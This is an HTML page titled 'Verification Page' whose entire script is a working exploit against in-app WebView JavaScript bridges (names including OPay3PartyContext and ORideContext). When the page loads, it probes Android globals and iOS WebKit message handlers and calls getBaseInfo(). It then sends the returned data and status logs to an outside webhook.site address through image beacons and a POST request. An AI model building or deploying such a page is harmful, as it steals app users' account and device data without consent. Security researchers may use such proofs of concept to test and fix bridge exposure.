<!DOCTYPE html>
<html>

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verification Page</title>
</head>

<body
  style="background: white; color: black; font-family: -apple-system, sans-serif; text-align: center; padding: 20px;">
  <h2 id="status">INITIALIZING...</h2>
  <div id="log"
    style="font-size: 11px; color: #666; text-align: left; max-width: 400px; margin: 0 auto; word-break: break-all;">
  </div>

  <script>
    (function () {
      var WEBHOOK = 'https://webhook.site/c4e48555-8559-4bb0-b04a-a347d20a7569';
      var status = document.getElementById('status');
      var logDiv = document.getElementById('log');

      function report(msg, type) {
        var div = document.createElement('div');
        div.style.marginBottom = '5px';
        div.style.color = type === 'success' ? 'green' : (type === 'error' ? 'red' : '#666');
        div.innerText = '[' + new Date().toLocaleTimeString() + '] ' + msg;
        logDiv.appendChild(div);

        // Exfiltrate via Image beacon for reliability
        var i = new Image();
        i.src = WEBHOOK + '?msg=' + encodeURIComponent(msg) + '&type=' + (type || 'info');
      }

      function sendFullData(label, data) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', WEBHOOK, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify({ label: label, data: data, timestamp: new Date().toISOString() }));
      }

      report('Exploit Cycle Started');
      status.innerText = 'EXECUTING...';

      var bridgeNames = ['control', 'OPay3PartyContext', 'ORideContext'];

      bridgeNames.forEach(function (name) {
        // 1. Direct Method (Android / Global Objects)
        try {
          if (window[name]) {
            report('Global Bridge found: ' + name);
            if (typeof window[name].getBaseInfo === 'function') {
              var info = window[name].getBaseInfo();
              report('Success: window.' + name + '.getBaseInfo() returned data', 'success');
              sendFullData('DirectCall_' + name, info);
              status.innerText = 'DATA CAPTURED';
            } else {
              report('Bridge ' + name + ' exists but no getBaseInfo found');
            }
          }
        } catch (e) {
          report('Error DirectCall ' + name + ': ' + e.message, 'error');
        }

        // 2. iOS WebKit postMessage Method
        try {
          if (window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers[name]) {
            report('iOS WebKit Handler found: ' + name);

            // Try action: getBaseInfo (standard)
            report('Sending postMessage to ' + name + ' (action: getBaseInfo)');
            window.webkit.messageHandlers[name].postMessage({ action: 'getBaseInfo' });

            // Try call: getBaseInfo (optional variant)
            setTimeout(function () {
              window.webkit.messageHandlers[name].postMessage({ call: 'getBaseInfo' });
            }, 500);

            status.innerText = 'MESSAGE SENT';
          }
        } catch (e) {
          report('Error WebKit ' + name + ': ' + e.message, 'error');
        }
      });

      // Catch-all: Check all webkit handlers
      try {
        if (window.webkit && window.webkit.messageHandlers) {
          var allHandlers = Object.keys(window.webkit.messageHandlers);
          if (allHandlers.length > 0) {
            report('All Detected iOS Handlers: ' + allHandlers.join(', '));
          }
        }
      } catch (e) { }

      setTimeout(function () {
        report('Exploit Cycle Complete');
        if (status.innerText !== 'DATA CAPTURED') {
          status.innerText = 'IDLE';
        }
      }, 3000);
    })();
  </script>
</body>

</html>